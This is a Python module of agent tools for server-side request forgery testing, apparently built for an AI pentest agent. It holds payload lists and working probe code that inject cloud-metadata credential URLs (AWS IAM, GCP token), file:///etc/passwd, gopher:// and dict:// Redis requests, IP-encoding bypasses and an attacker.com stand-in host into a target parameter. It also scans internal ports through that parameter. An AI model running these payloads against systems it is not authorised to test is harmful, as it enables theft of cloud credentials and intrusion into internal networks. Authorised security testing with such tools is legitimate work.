"""SSRF detection and exploitation tools.

Migrated from Shannon's SSRF attack knowledge base.  Covers:
  - Internal service probing (127.0.0.1, localhost, cloud metadata)
  - Protocol smuggling (file://, gopher://, dict://)
  - Port scanning / service discovery
  - Blind / semi-blind / classic SSRF classification
  - OOB confirmation via Interactsh / webhook
"""

from __future__ import annotations

import difflib
import re
import time
from typing import Any
from urllib.parse import urlparse

from langchain_core.tools import tool

from .http_client import normalize_url, request
from .results import Evidence, Finding, RequestRecord, ToolResult, error_result, response_record

# ── SSRF target categories from Shannon ───────────────────────────────

INTERNAL_HOSTS = [
    "127.0.0.1",
    "localhost",
    "[::1]",
    "0.0.0.0",
    "127.0.0.2",
    "127.0.0.3",
]

INTERNAL_PORTS = [
    (80, "HTTP"),
    (443, "HTTPS"),
    (8080, "HTTP Alt / Admin"),
    (8443, "HTTPS Alt"),
    (3000, "Node.js / Grafana"),
    (3306, "MySQL"),
    (5432, "PostgreSQL"),
    (6379, "Redis"),
    (27017, "MongoDB"),
    (22, "SSH"),
    (25, "SMTP"),
    (9200, "Elasticsearch"),
    (9090, "Prometheus"),
    (5000, "Flask dev"),
    (8000, "Django dev"),
    (9000, "PHP-FPM"),
]

CLOUD_METADATA = [
    (
        "AWS IMDSv1",
        "http://169.254.169.254/latest/meta-data/",
        {},
    ),
    (
        "AWS IMDSv1 IAM",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        {},
    ),
    (
        "Azure IMDS",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        {"Metadata": "true"},
    ),
    (
        "GCP computeMetadata",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        {"Metadata-Flavor": "Google"},
    ),
    (
        "GCP project",
        "http://metadata.google.internal/computeMetadata/v1/project/project-id",
        {"Metadata-Flavor": "Google"},
    ),
    (
        "DigitalOcean",
        "http://169.254.169.254/metadata/v1.json",
        {},
    ),
    (
        "Oracle Cloud",
        "http://169.254.169.254/opc/v1/instance/",
        {},
    ),
    (
        "Alibaba Cloud",
        "http://100.100.100.200/latest/meta-data/",
        {},
    ),
]

DANGEROUS_SCHEMES = [
    ("file:///etc/passwd", "Local file read via file://"),
    ("file:///c:/windows/win.ini", "Windows file read via file://"),
    ("gopher://127.0.0.1:6379/_INFO", "Redis via gopher://"),
    ("dict://127.0.0.1:6379/info", "Redis via dict://"),
    ("ftp://attacker.com/ssrf-test", "FTP connection test"),
]

URL_BYPASS_PATTERNS = [
    ("http://127.0.0.1:8080/admin", "Direct internal IP"),
    ("http://localhost:8080/admin", "localhost hostname"),
    ("http://0.0.0.0:8080/admin", "0.0.0.0 address"),
    ("http://[::1]:8080/admin", "IPv6 loopback"),
    ("http://127.1/admin", "Shortened IPv4"),
    ("http://2130706433/admin", "Decimal IP encoding"),
    ("http://0x7f000001/admin", "Hex IP encoding"),
    ("http://017700000001/admin", "Octal IP encoding"),
    ("http://127.0.0.1.xip.io/admin", "xip.io DNS rebinding"),
    ("http://127.0.0.1.nip.io/admin", "nip.io DNS rebinding"),
]

SSRF_BLIND_MARKERS = [
    "connection refused",
    "connection timed out",
    "could not connect",
    "no route to host",
    "network is unreachable",
    "tls handshake timeout",
    "certificate verification failed",
    "invalid url",
    "unsupported protocol",
    "dns resolution failed",
    "getaddrinfo",
    "name or service not known",
    "blocked by security policy",
    "ssrf detected",
    "url not allowed",
]

_MAX_PORT_SCAN = 10
_SCAN_TIMEOUT = 5


def _time_request(method: str, url: str, **kwargs) -> tuple[Any, float, str | None]:
    """Send a request and return (response|None, elapsed, error_message|None)."""
    start = time.monotonic()
    try:
        opts = {"timeout": kwargs.pop("timeout", _SCAN_TIMEOUT)}
        opts.update(kwargs)
        resp = request(method, url, **opts)
        elapsed = time.monotonic() - start
        return resp, elapsed, None
    except Exception as exc:
        elapsed = time.monotonic() - start
        return None, elapsed, str(exc)


def _classify_ssrf_type(
    has_response_body: bool,
    error_message: str | None,
    elapsed: float,
    baseline_elapsed: float,
) -> str:
    """Classify the SSRF type: classic, blind, semi_blind, or none."""
    if has_response_body and error_message is None:
        return "classic"
    if error_message and elapsed < baseline_elapsed * 0.3:
        return "blind"
    if elapsed > baseline_elapsed * 2:
        return "semi_blind"
    return "none"


def _detect_ssrf_signal(text: str, error_msg: str | None) -> tuple[int, list[str]]:
    """Score SSRF response for internal access signals."""
    score = 0
    signals: list[str] = []
    lower = (text or "").lower()

    # Cloud metadata markers
    cloud_markers = [
        ("ami-id", "AWS AMI ID"),
        ("instance-id", "Cloud instance ID"),
        ("security-credentials", "AWS IAM credentials path"),
        ("computeMetadata", "GCP metadata endpoint"),
        ("Metadata-Flavor", "GCP metadata header context"),
        ("azEnvironment", "Azure environment"),
        ("digitalocean", "DigitalOcean metadata"),
    ]
    for marker, label in cloud_markers:
        if marker.lower() in lower:
            score += 90
            signals.append(f"cloud metadata: {label}")

    # Internal service markers
    service_markers = [
        ("redis_version", "Redis version"),
        ("-DENIED", "Redis access"),
        ("# Server", "Redis/Memcached banner"),
        ("mysql_native_password", "MySQL protocol"),
        ("postgresql", "PostgreSQL response"),
        ("mongodb", "MongoDB response"),
        ("elasticsearch", "Elasticsearch"),
        ("kibana", "Kibana"),
        ("grafana", "Grafana"),
        ("prometheus", "Prometheus"),
    ]
    for marker, label in service_markers:
        if marker.lower() in lower:
            score += 70
            signals.append(f"internal service: {label}")

    # File content (file:// protocol)
    file_markers = [
        ("root:x:0:0", "/etc/passwd via SSRF"),
        ("[fonts]", "Windows win.ini via SSRF"),
        ("[extensions]", "Windows config via SSRF"),
        ("#!/bin", "Script file via SSRF"),
        ("<?php", "PHP source via SSRF"),
    ]
    for marker, label in file_markers:
        if marker.lower() in lower:
            score += 80
            signals.append(f"file content: {label}")

    # Error-based information leakage
    if error_msg:
        err_lower = error_msg.lower()
        for marker in SSRF_BLIND_MARKERS:
            if marker in err_lower:
                score += 20
                signals.append(f"error-based info leak: {marker}")
                break

    # Status code signals
    if not error_msg:
        score += 5
        signals.append("internal target reachable")

    return score, signals


# ── Public Tools ──────────────────────────────────────────────────────


@tool
def test_ssrf(
    url: str,
    param: str,
    method: str = "GET",
    body_template: str = "",
    param_location: str = "query",
) -> str:
    """Test a single parameter for Server-Side Request Forgery (SSRF).

    Probes internal hosts, cloud metadata endpoints, and dangerous URL schemes
    through the target parameter.  Classifies findings as classic (response
    returned), blind (immediate error), or semi-blind (timing-based).

    Use this when you discover a parameter that accepts URLs or hostnames —
    webhook callbacks, import URLs, proxy endpoints, redirect parameters, etc.

    Parameters:
        url: Target URL containing the SSRF-prone parameter.
        param: Parameter name to inject SSRF payloads into.
        method: HTTP method (GET or POST).
        body_template: For POST, raw body with {PAYLOAD} placeholder.
        param_location: Where the param sits — "query", "body_json", "body_form",
                        or "header".
    """
    target = normalize_url(url)
    method_norm = method.strip().upper()
    if method_norm not in ("GET", "POST"):
        return error_result("test_ssrf", target, "only GET and POST are supported").to_text()

    # Baseline request to the original target
    try:
        baseline, baseline_elapsed, _ = _time_request(method_norm, target)
        baseline_text = baseline.text if baseline else ""
    except Exception as exc:
        return error_result("test_ssrf", target, f"baseline request failed: {exc}").to_text()

    findings: list[Finding] = []
    attempts: list[dict[str, Any]] = []
    errors: list[dict[str, str]] = []
    overall_ssrf_type = "none"
    best_score = 0

    # ── Phase 1: Cloud metadata probes (highest value) ──────────────
    for label, metadata_url, headers in CLOUD_METADATA[:5]:
        # Build probe URL by replacing the parameter
        if param_location == "query":
            from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

            parsed = urlparse(target)
            pairs = [(k, metadata_url if k == param else v) for k, v in parse_qsl(parsed.query, keep_blank_values=True)]
            if not any(k == param for k, _ in pairs):
                pairs.append((param, metadata_url))
            probe_url = urlunparse(parsed._replace(query=urlencode(pairs, doseq=True)))
            probe_body = None
        elif body_template:
            probe_url = target
            probe_body = body_template.replace("{PAYLOAD}", metadata_url).encode()
        else:
            continue

        try:
            resp, elapsed, err = _time_request(method_norm, probe_url, data=probe_body, timeout=8)
            resp_text = resp.text if resp else ""
            score, signals = _detect_ssrf_signal(resp_text, err)
            ssrf_type = _classify_ssrf_type(bool(resp_text) and not err, err, elapsed, baseline_elapsed)

            attempt = {
                "target": label,
                "payload": metadata_url,
                "status": resp.status_code if resp else "error",
                "elapsed": round(elapsed, 3),
                "score": score,
                "signals": signals,
                "ssrf_type": ssrf_type,
            }
            attempts.append(attempt)
            if score > best_score:
                best_score = score
                overall_ssrf_type = ssrf_type

            if score >= 80:
                break
        except Exception as exc:
            errors.append({"kind": "connection_error", "message": f"{label}: {exc}"})

    # ── Phase 2: Internal host:port probes ─────────────────────────
    if best_score < 50:
        for host in INTERNAL_HOSTS[:3]:
            for port, service in INTERNAL_PORTS[:5]:
                probe_payload = f"http://{host}:{port}/"
                if param_location == "query":
                    from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

                    parsed = urlparse(target)
                    pairs = [(k, probe_payload if k == param else v) for k, v in parse_qsl(parsed.query, keep_blank_values=True)]
                    if not any(k == param for k, _ in pairs):
                        pairs.append((param, probe_payload))
                    probe_url = urlunparse(parsed._replace(query=urlencode(pairs, doseq=True)))
                    probe_body = None
                elif body_template:
                    probe_url = target
                    probe_body = body_template.replace("{PAYLOAD}", probe_payload).encode()
                else:
                    continue

                try:
                    resp, elapsed, err = _time_request(method_norm, probe_url, data=probe_body, timeout=4)
                    resp_text = resp.text if resp else ""
                    score, signals = _detect_ssrf_signal(resp_text, err)
                    ssrf_type = _classify_ssrf_type(bool(resp_text) and not err, err, elapsed, baseline_elapsed)

                    attempts.append({
                        "target": f"{host}:{port} ({service})",
                        "payload": probe_payload,
                        "status": resp.status_code if resp else "error",
                        "elapsed": round(elapsed, 3),
                        "score": score,
                        "signals": signals,
                        "ssrf_type": ssrf_type,
                    })
                    if score > best_score:
                        best_score = score
                        overall_ssrf_type = ssrf_type
                except Exception:
                    pass

    # ── Phase 3: Dangerous scheme probes ───────────────────────────
    if best_score < 50:
        for scheme_payload, description in DANGEROUS_SCHEMES[:3]:
            if param_location == "query":
                from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

                parsed = urlparse(target)
                pairs = [(k, scheme_payload if k == param else v) for k, v in parse_qsl(parsed.query, keep_blank_values=True)]
                if not any(k == param for k, _ in pairs):
                    pairs.append((param, scheme_payload))
                probe_url = urlunparse(parsed._replace(query=urlencode(pairs, doseq=True)))
                probe_body = None
            elif body_template:
                probe_url = target
                probe_body = body_template.replace("{PAYLOAD}", scheme_payload).encode()
            else:
                continue

            try:
                resp, elapsed, err = _time_request(method_norm, probe_url, data=probe_body, timeout=6)
                resp_text = resp.text if resp else ""
                score, signals = _detect_ssrf_signal(resp_text, err)
                ssrf_type = _classify_ssrf_type(bool(resp_text) and not err, err, elapsed, baseline_elapsed)
                attempts.append({
                    "target": description,
                    "payload": scheme_payload,
                    "status": resp.status_code if resp else "error",
                    "elapsed": round(elapsed, 3),
                    "score": score,
                    "signals": signals,
                    "ssrf_type": ssrf_type,
                })
                if score > best_score:
                    best_score = score
                    overall_ssrf_type = ssrf_type
            except Exception as exc:
                errors.append({"kind": "connection_error", "message": f"{description}: {exc}"})

    # ── Resolve confidence ─────────────────────────────────────────
    confidence = "unconfirmed"
    if best_score >= 80:
        confidence = "confirmed"
    elif best_score >= 35:
        confidence = "likely"
    elif best_score > 0:
        confidence = "weak"

    # ── Build readable output ─────────────────────────────────────
    lines = [
        f"[test_ssrf] {target}",
        f"Parameter: {param} | Method: {method_norm}",
        f"Baseline: {baseline.status_code} {len(baseline_text)} chars, {baseline_elapsed:.2f}s",
        f"SSRF Classification: {overall_ssrf_type}",
        f"Confidence: {confidence}",
        f"Best score: {best_score}",
        "",
    ]

    ranked = sorted(attempts, key=lambda a: a["score"], reverse=True)
    for i, a in enumerate(ranked[:6]):
        lines.append(
            f"  [{a['ssrf_type']}] {a['target']} → status={a['status']} "
            f"score={a['score']} elapsed={a['elapsed']}s"
        )
        if a["signals"]:
            lines.append(f"    Signals: {'; '.join(a['signals'])}")

    if not ranked:
        lines.append("No SSRF signal detected across all probes.")

    readable = "\n".join(lines)

    evidence_list = []
    best_attempt = ranked[0] if ranked else None
    if best_attempt and best_attempt["score"] >= 20:
        evidence_list.append(Evidence(
            "ssrf_probe",
            f"SSRF {overall_ssrf_type}: {best_attempt['signals'][0] if best_attempt['signals'] else 'internal reachability'}",
            best_attempt.get("payload", target),
            {"score": best_attempt["score"], "ssrf_type": overall_ssrf_type},
        ))

    finding = None
    if confidence in ("confirmed", "likely"):
        finding = Finding(
            title="服务端请求伪造 (SSRF) 漏洞",
            severity="high" if confidence == "confirmed" else "medium",
            confidence=confidence,
            category="ssrf",
            evidence=evidence_list,
            reproduction=[
                f"发送 {method_norm} {target}",
                f"将参数 {param} 替换为内部服务 / 云元数据地址",
                "观察响应中是否包含内部服务数据或云凭证",
            ],
        )

    return ToolResult(
        tool="test_ssrf",
        target=target,
        status="ok",
        summary=f"SSRF 检测结论：{confidence} ({overall_ssrf_type})",
        raw_excerpt=readable,
        findings=[finding] if finding else [],
        errors=errors,
        request=RequestRecord(method_norm, target, parameters={"param": param}),
        response=response_record(baseline),
        data={
            "ssrf_type": overall_ssrf_type,
            "best_score": best_score,
            "confidence": confidence,
            "attempts": ranked[:10],
        },
    ).to_text()


@tool
def probe_internal_port(
    url: str,
    param: str,
    host: str = "127.0.0.1",
    ports: str = "",
    method: str = "GET",
) -> str:
    """Probe internal ports through an SSRF vector to discover services.

    Attempts connections to common internal ports through the vulnerable
    parameter and infers running services from response timing and content.

    Parameters:
        url: Target with the SSRF-prone parameter.
        param: Parameter name to inject through.
        host: Internal host to target (default 127.0.0.1).
        ports: Comma-separated port list, or empty for defaults (80,443,8080,3306,6379,9200).
        method: HTTP method (GET or POST).
    """
    target = normalize_url(url)
    method_norm = method.strip().upper()
    if method_norm not in ("GET", "POST"):
        return error_result("probe_internal_port", target, "unsupported method").to_text()

    port_list = [int(p.strip()) for p in (ports or "80,443,8080,3000,3306,5432,6379,9200,22,25").split(",") if p.strip()]
    port_list = port_list[:_MAX_PORT_SCAN]

    from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

    results: list[dict[str, Any]] = []
    for port in port_list:
        probe_payload = f"http://{host}:{port}/"
        parsed = urlparse(target)
        pairs = [(k, probe_payload if k == param else v) for k, v in parse_qsl(parsed.query, keep_blank_values=True)]
        if not any(k == param for k, _ in pairs):
            pairs.append((param, probe_payload))
        probe_url = urlunparse(parsed._replace(query=urlencode(pairs, doseq=True)))

        try:
            resp, elapsed, err = _time_request(method_norm, probe_url, timeout=3)
            if resp:
                results.append({
                    "port": port,
                    "status": resp.status_code,
                    "length": len(resp.text),
                    "elapsed": round(elapsed, 3),
                    "open": True,
                    "preview": (resp.text or "")[:200],
                })
            elif err:
                results.append({
                    "port": port,
                    "status": "error",
                    "elapsed": round(elapsed, 3),
                    "open": elapsed > 1.0,
                    "error": err[:200],
                })
        except Exception as exc:
            results.append({"port": port, "status": "error", "open": False, "error": str(exc)[:200]})

    open_ports = [r for r in results if r.get("open")]
    lines = [
        f"[probe_internal_port] {host} via {target}",
        f"Scanned {len(results)} ports, {len(open_ports)} reachable",
    ]
    for r in results:
        marker = "✓" if r.get("open") else "✗"
        lines.append(f"  {marker} :{r['port']} status={r.get('status')} elapsed={r.get('elapsed', '?')}s")

    readable = "\n".join(lines)

    findings = []
    if open_ports:
        findings.append(Finding(
            title=f"SSRF 内部端口扫描：{host} 发现 {len(open_ports)} 个可访问端口",
            severity="medium",
            confidence="confirmed" if len(open_ports) >= 3 else "likely",
            category="ssrf",
            evidence=[Evidence(
                "port_scan",
                f"Probed {host} ports {[r['port'] for r in open_ports]} through SSRF",
                target,
                {"open_ports": open_ports},
            )],
            reproduction=[f"通过参数 {param} 注入 http://{host}:PORT/ 探测内部服务"],
        ))

    return ToolResult(
        tool="probe_internal_port",
        target=target,
        status="ok",
        summary=f"{host} 端口扫描：{len(open_ports)}/{len(results)} 可达",
        raw_excerpt=readable,
        findings=findings,
        request=RequestRecord(method_norm, target, parameters={"param": param, "host": host}),
        data={"host": host, "ports_scanned": len(results), "open_ports": open_ports},
    ).to_text()
